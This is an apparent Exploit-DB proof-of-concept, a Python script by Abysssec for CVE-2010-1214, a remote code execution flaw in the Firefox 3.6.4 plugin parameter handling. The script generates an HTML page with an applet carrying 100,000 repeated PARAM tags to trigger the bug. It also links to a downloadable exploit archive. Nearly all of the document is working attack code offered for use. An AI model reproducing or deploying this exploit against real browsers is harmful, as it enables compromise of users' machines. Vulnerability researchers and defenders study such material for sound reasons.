'''
  __  __  ____         _    _ ____  
 |  \/  |/ __ \   /\  | |  | |  _ \ 
 | \  / | |  | | /  \ | |  | | |_) |
 | |\/| | |  | |/ /\ \| |  | |  _ < 
 | |  | | |__| / ____ \ |__| | |_) |
 |_|  |_|\____/_/    \_\____/|____/ 

http://www.exploit-db.com/moaub-17-firefox-plugin-parameter-ensurecachedattrparamarrays-remote-code-execution/
https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/15027.zip (moaub-17-exploit.zip)
'''
'''
  Title              :  Firefox Plugin Parameter EnsureCachedAttrParamArrays Remote Code Execution
  Version            :  Firefox 3.6.4
  Analysis           :  http://www.abysssec.com
  Vendor             :  http://www.mozilla.com
  Impact             :  Critical
  Contact            :  shahin [at] abysssec.com , info  [at] abysssec.com
  Twitter            :  @abysssec
  CVE                :  CVE-2010-1214
  
'''

import sys;

myStyle = """
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<title>page demonstration</title>
<link rel="stylesheet" type="text/css" href="style2.css" />


</head>
<body id='msg'>


    <applet code = 'appletComponentArch.DynamicTreeApplet'   archive = 'DynamicTreeDemo.jar', width = 300, height = 300 >

"""
i=0
while(i<100000):
    myStyle = myStyle + "<PARAM name='snd' value='Hello.au|Welcome.au'>\n";
    i=i+1

myStyle = myStyle + """
	</applet>

</body>
</html>
"""
cssFile = open("Abysssec.html","w")
cssFile.write(myStyle)
cssFile.close()